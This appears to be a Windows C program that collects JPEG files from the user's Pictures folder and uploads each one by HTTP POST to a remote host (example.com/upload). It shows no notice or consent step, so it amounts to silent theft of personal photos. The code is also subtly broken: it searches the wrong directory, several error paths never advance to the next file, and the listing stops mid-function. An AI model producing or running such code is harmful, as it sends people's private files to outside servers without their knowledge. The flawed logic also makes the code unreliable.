#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>

#pragma comment(lib, "wininet.lib")

int main() {
    TCHAR picturesPath[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_MYPICTURES, NULL, 0, picturesPath) != S_OK) {
        printf("Failed to get Pictures folder path.\n");
        return 1;
    }
    printf("Pictures folder path: %s\n", picturesPath);

    WIN32_FIND_DATA findData;
    HANDLE hFind = FindFirstFile(TEXT("*.jpg"), &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("No JPEG files found in Pictures folder.\n");
        return 1;
    }

    HINTERNET hInternet = InternetOpen(TEXT("HTTP POST"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("Failed to open Internet handle.\n");
        return 1;
    }

    HINTERNET hConnect = InternetConnect(hInternet, TEXT("example.com"), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL) {
        printf("Failed to establish HTTP connection.\n");
        InternetCloseHandle(hInternet);
        return 1;
    }

    TCHAR filePath[MAX_PATH];
    DWORD fileSize;
    while (hFind != INVALID_HANDLE_VALUE) {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!FindNextFile(hFind, &findData)) {
                FindClose(hFind);
                hFind = INVALID_HANDLE_VALUE;
            }
            continue;
        }

        PathCombine(filePath, picturesPath, findData.cFileName);
        printf("Found JPEG file: %s\n", filePath);

        HANDLE hFile = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            printf("Failed to open file.\n");
            continue;
        }

        fileSize = GetFileSize(hFile, NULL);
        BYTE* fileData = (BYTE*)malloc(fileSize);
        if (fileData == NULL) {
            printf("Failed to allocate memory.\n");
            CloseHandle(hFile);
            continue;
        }

        DWORD bytesRead;
        if (!ReadFile(hFile, fileData, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
            printf("Failed to read file.\n");
            CloseHandle(hFile);
            free(fileData);
            continue;
        }

        CHAR requestHeaders[] = "Content-Type: image/jpeg\r\nConnection: close\r\n";
        HINTERNET hRequest = HttpOpenRequest(hConnect, TEXT("POST"), TEXT("/upload"), NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
        if (hRequest == NULL) {
            printf("Failed to open HTTP request handle.\n");
            CloseHandle(hFile);
            free(fileData);
            continue;
        }

        if (!HttpSendRequest(hRequest, requestHeaders, strlen(requestHeaders), fileData, fileSize)) {
            printf("Failed to send HTTP request.\n");
            InternetCloseHandle(hRequest);
            CloseHandle(hFile);
            free(fileData);
            continue;
        }

        CHAR responseHeaders[1024];
        DWORD responseHeadersSize = sizeof(responseHeaders);
       
